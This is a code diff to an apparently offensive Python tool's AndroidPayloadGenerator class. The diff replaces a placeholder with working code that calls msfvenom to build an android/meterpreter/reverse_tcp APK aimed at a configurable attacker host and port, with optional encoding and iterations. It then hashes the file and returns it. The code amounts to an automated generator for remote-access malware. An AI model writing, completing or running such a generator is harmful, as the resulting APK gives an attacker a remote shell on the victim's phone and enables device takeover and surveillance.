@@ -508,7 +508,7 @@ class AndroidPayloadGenerator:
             return False
     
     async def generate_android_payload(self, config: PayloadConfig) -> PayloadResult:
-        """生成Android載荷"""
+        """生成Android載荷 - 真實實現"""
         try:
             if not self.apktool_available:
                 # 使用MSFVenom作為後備方案
@@ -523,19 +523,72 @@ class AndroidPayloadGenerator:
                         error_message="APKTool和MSFVenom都不可用"
                     )
             
-            # 使用APKTool生成APK（簡化實現）
-            temp_dir = Path(tempfile.gettempdir()) / "aiva_android"
-            temp_dir.mkdir(exist_ok=True)
+            # 使用MSFVenom生成Android APK
+            logger.info(f"Generating Android APK payload for {config.lhost}:{config.lport}")
             
-            # 這裡需要實現APK生成邏輯
-            # 暫時返回一個占位符結果
-            return PayloadResult(
-                config=config,
-                success=False,
-                error_message="Android載荷生成功能正在開發中"
+            # 構建msfvenom命令
+            cmd = [
+                "msfvenom",
+                "-p", "android/meterpreter/reverse_tcp",
+                f"LHOST={config.lhost}",
+                f"LPORT={config.lport}",
+                "-o", f"/tmp/aiva_payload_{config.lhost}_{config.lport}.apk"
+            ]
+            
+            # 編碼選項
+            if config.encoder:
+                cmd.extend(["-e", config.encoder])
+                if config.iterations and config.iterations > 1:
+                    cmd.extend(["-i", str(config.iterations)])
+            
+            # 執行命令
+            process = await asyncio.create_subprocess_exec(
+                *cmd,
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
             )
             
+            stdout, stderr = await process.communicate()
+            
+            if process.returncode != 0:
+                error_msg = stderr.decode('utf-8', errors='ignore')
+                logger.error(f"Android APK generation failed: {error_msg}")
+                return PayloadResult(
+                    config=config,
+                    success=False,
+                    error_message=f"APK generation failed: {error_msg[:200]}"
+                )
+            
+            # 讀取生成的APK
+            apk_path = f"/tmp/aiva_payload_{config.lhost}_{config.lport}.apk"
+            if Path(apk_path).exists():
+                with open(apk_path, 'rb') as f:
+                    apk_data = f.read()
+                
+                # 計算hash
+                import hashlib
+                md5_hash = hashlib.md5(apk_data).hexdigest()
+                sha256_hash = hashlib.sha256(apk_data).hexdigest()
+                
+                logger.info(f"✅ Android APK generated: {len(apk_data)} bytes, MD5: {md5_hash}")
+                
+                return PayloadResult(
+                    config=config,
+                    success=True,
+                    payload=apk_path,
+                    size=len(apk_data),
+                    md5=md5_hash,
+                    sha256=sha256_hash
+                )
+            else:
+                return PayloadResult(
+                    config=config,
+                    success=False,
+                    error_message="APK file not found after generation"
+                )
+            
         except Exception as e:
+            logger.exception(f"Android payload generation error: {e}")
             return PayloadResult(
                 config=config,
                 success=False,
